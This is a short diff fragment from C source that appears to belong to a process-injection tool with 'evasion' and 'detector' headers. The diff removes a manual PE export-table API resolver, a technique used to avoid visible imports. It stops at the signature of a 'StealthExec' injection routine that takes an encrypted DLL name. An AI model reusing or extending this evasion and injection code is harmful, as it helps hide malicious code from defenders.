@@ -5,27 +5,6 @@
 #include "detector.h"
 #include "evasion.h"
 
-// Function to Resolve APIs
-FARPROC ResolveFn(LPCSTR mod, LPCSTR fn) {
-    HMODULE hMod = GetModuleHandle(mod);
-    if (!hMod) return NULL;
-
-    IMAGE_DOS_HEADER* dosHdr = (IMAGE_DOS_HEADER*)hMod;
-    IMAGE_NT_HEADERS* ntHdr = (IMAGE_NT_HEADERS*)((BYTE*)hMod + dosHdr->e_lfanew);
-    IMAGE_EXPORT_DIRECTORY* expDir = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)hMod + ntHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
-
-    DWORD* names = (DWORD*)((BYTE*)hMod + expDir->AddressOfNames);
-    WORD* ords = (WORD*)((BYTE*)hMod + expDir->AddressOfNameOrdinals);
-    DWORD* funcs = (DWORD*)((BYTE*)hMod + expDir->AddressOfFunctions);
-
-    for (DWORD i = 0; i < expDir->NumberOfNames; i++) {
-        LPCSTR currFn = (LPCSTR)((BYTE*)hMod + names[i]);
-        if (strcmp(currFn, fn) == 0) {
-            return (FARPROC)((BYTE*)hMod + funcs[ords[i]]);
-        }
-    }
-    return NULL;
-}
 
 // Core Injection Logic
 void StealthExec(HANDLE hProc, HANDLE hThread, const char* dllEnc) {
